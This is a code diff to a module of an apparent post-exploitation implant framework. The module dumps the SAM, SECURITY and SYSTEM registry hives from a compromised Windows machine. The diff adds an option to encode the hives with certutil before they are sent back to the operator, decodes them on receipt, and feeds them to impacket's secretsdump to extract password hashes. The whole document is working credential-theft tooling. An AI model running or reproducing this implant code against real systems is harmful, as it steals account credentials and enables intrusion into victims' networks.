@@ -11,6 +11,7 @@ class HashDumpSAMImplant(core.implant.Implant):
         self.options.register("LPATH", "/tmp/", "local file save path")
         self.options.register("RPATH", "%TEMP%", "remote file save path")
         self.options.register("GETSYSHIVE", "false", "Retrieve the system hive? (slower, but more reliable)",enum=["true", "false"])
+        self.options.register("CERTUTIL", "false", "use certutil to base64 encode the file before downloading", required=True, boolean=True)
 
     def job(self):
         return HashDumpSAMJob
@@ -18,6 +19,7 @@ class HashDumpSAMImplant(core.implant.Implant):
     def run(self):
 
         import os.path
+        import os
         if not os.path.isfile("data/impacket/examples/secretsdump.py"):
             old_prompt = self.shell.prompt
             old_clean_prompt = self.shell.clean_prompt
@@ -29,6 +31,10 @@ class HashDumpSAMImplant(core.implant.Implant):
                 import readline
                 readline.set_completer(None)
                 option = self.shell.get_command(self.shell.prompt)
+
+                if self.shell.spool:
+                    self.shell.spool_log(self.shell.clean_prompt, option)
+
                 if option.lower() == "y":
                     from subprocess import call
                     call(["git", "submodule", "init"])
@@ -40,16 +46,15 @@ class HashDumpSAMImplant(core.implant.Implant):
                 self.shell.prompt = old_prompt
                 self.shell.clean_prompt = old_clean_prompt
 
-        self.options.set("RPATH", self.options.get('RPATH').replace("\\", "\\\\").replace('"', '\\"'))
-
         payloads = {}
-        payloads["js"] = self.loader.load_script("data/implant/gather/hashdump_sam.js", self.options)
+        payloads["js"] = "data/implant/gather/hashdump_sam.js"
 
         self.dispatch(payloads, self.job)
 
 class HashDumpSAMJob(core.job.Job):
 
     def create(self):
+        self.options.set("RPATH", self.options.get('RPATH').replace("\\", "\\\\").replace('"', '\\"'))
         if self.session_id == -1:
             return
         if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
@@ -102,12 +107,13 @@ class HashDumpSAMJob(core.job.Job):
             self.security_encoder = handler.get_header("encoder", 1252)
             return
 
-        # dump sam here
+        if data.decode() == "Complete":
+            # dump sam here
 
-        import threading
-        self.finished = False
-        threading.Thread(target=self.finish_up).start()
-        handler.reply(200)
+            import threading
+            self.finished = False
+            threading.Thread(target=self.finish_up).start()
+            handler.reply(200)
 
     def finish_up(self):
 
@@ -115,13 +121,31 @@ class HashDumpSAMJob(core.job.Job):
         path = "data/impacket/examples/secretsdump.py"
 
         self.sam_file = self.save_file(self.sam_data, "SAM", self.sam_encoder)
+        if self.options.get("CERTUTIL") == "true":
+            with open(self.sam_file, "rb") as f:
+                data = f.read()
+            data = self.decode_downloaded_data(data, "936")
+            with open(self.sam_file, "wb") as f:
+                f.write(data)
         self.print_status("decoded SAM hive (%s)" % self.sam_file)
 
         self.security_file = self.save_file(self.security_data, "SECURITY", self.security_encoder)
+        if self.options.get("CERTUTIL") == "true":
+            with open(self.security_file, "rb") as f:
+                data = f.read()
+            data = self.decode_downloaded_data(data, "936")
+            with open(self.security_file, "wb") as f:
+                f.write(data)
         self.print_status("decoded SECURITY hive (%s)" % self.security_file)
 
         if self.system_data:
             self.system_file = self.save_file(self.system_data, "SYSTEM", self.system_encoder)
+            if self.options.get("CERTUTIL") == "true":
+                with open(self.system_file, "rb") as f:
+                    data = f.read()
+                data = self.decode_downloaded_data(data, "936")
+                with open(self.system_file, "wb") as f:
+                    f.write(data)
             self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
             cmd = ['python2', path, '-sam', self.sam_file, '-system', self.system_file, '-security', self.security_file, 'LOCAL']
         else:
@@ -168,7 +192,6 @@ class HashDumpSAMJob(core.job.Job):
 
         p = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True, env={"PYTHONPATH": "./data/impacket"})
         output = p.stdout.read().decode()
-        self.shell.print_plain(output)
         self.results = output
 
         cp = core.cred_parser.CredParse(self)
@@ -177,7 +200,7 @@ class HashDumpSAMJob(core.job.Job):
         super(HashDumpSAMJob, self).report(None, "", False)
 
     def done(self):
-        pass
+        self.display()
 
     def display(self):
-        pass
+        self.shell.print_plain(self.results)
